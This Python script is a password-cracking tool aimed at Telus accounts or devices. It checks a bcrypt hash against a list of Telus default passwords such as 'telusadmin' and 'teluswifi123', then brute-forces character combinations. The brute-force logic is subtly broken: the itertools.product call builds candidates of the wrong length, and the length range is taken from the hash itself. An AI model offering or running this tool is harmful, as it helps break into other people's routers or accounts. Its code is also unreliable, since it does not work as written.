import itertools
import bcrypt

# Configuration
uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
lowercase_letters = "abcdefghijklmnopqrstuvwxyz"
numbers = "0123456789"
special_characters = "!@#$%^&*()_+-=[]{}|;':,.<>?/`~"

MIN_PASSWORD_LENGTH = 8
MIN_UPPERCASE_LETTERS = 1
MIN_LOWERCASE_LETTERS = 1
MIN_NUMBERS = 1
MIN_SPECIAL_CHARACTERS = 1

DEFAULT_PASSWORDS = [
    "telus",
    "telus123",
    "telusadmin",
    "telusadmin123",
    "teluswifi",
    "teluswifi123",
    "teluswireless",
    "teluswireless123",
]

def check_password_strength(password):
    return (
        len(password) >= MIN_PASSWORD_LENGTH
        and sum(1 for c in password if c.isupper()) >= MIN_UPPERCASE_LETTERS
        and sum(1 for c in password if c.islower()) >= MIN_LOWERCASE_LETTERS
        and sum(1 for c in password if c.isdigit()) >= MIN_NUMBERS
        and sum(1 for c in password if c in special_characters) >= MIN_SPECIAL_CHARACTERS
    )

def generate_password_combinations(char_sets, password_length):
    combinations = itertools.product(*char_sets, repeat=password_length)
    return itertools.islice(combinations, len(char_sets)**password_length)

def brute_force_telus_password(target_password):
    # Check the default passwords first
    for default_password in DEFAULT_PASSWORDS:
        if bcrypt.checkpw(default_password.encode(), target_password):
            print(f"Success! Password found: {default_password}")
            return

    char_sets = [
        uppercase_letters,
        lowercase_letters,
        numbers,
        special_characters
    ]

    max_len = len(target_password)
    for password_length in range(MIN_PASSWORD_LENGTH, max_len + 1):
        combinations = generate_password_combinations(char_sets, password_length)

        for combination in combinations:
            password = "".join(combination)
            if check_password_strength(password) and bcrypt.checkpw(password.encode(), target_password):
                print(f"Success! Password found: {password}")
                return

target_password = input("Enter the target password: ").encode()
brute_force_telus_password(target_password)
